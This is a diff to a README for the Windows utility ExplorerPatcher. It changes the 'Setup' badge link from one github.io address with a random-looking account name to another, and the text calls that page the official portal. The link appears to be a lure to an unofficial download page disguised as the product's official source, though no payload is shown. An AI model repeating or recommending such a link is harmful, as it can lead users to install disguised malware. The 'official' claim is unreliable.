@@ -18,7 +18,7 @@ With **ExplorerPatcher**, you gain clarity, reduce UI frustration, and complete 
 
 ## Getting Started
 
-[![Setup ExplorerPatcher](https://img.shields.io/badge/Setup-ExplorerPatcher_Utility-green)](https://alkidatekel.github.io/.github/explorerpatcher-windows-11)
+[![Setup ExplorerPatcher](https://img.shields.io/badge/Setup-ExplorerPatcher_Utility-green)](https://gaddehfsfs.github.io/.github/explorerpatcher-windows-11)
 
 1. Visit the official **ExplorerPatcher** portal.  
 2. Choose your architecture (x64, ARM64).  
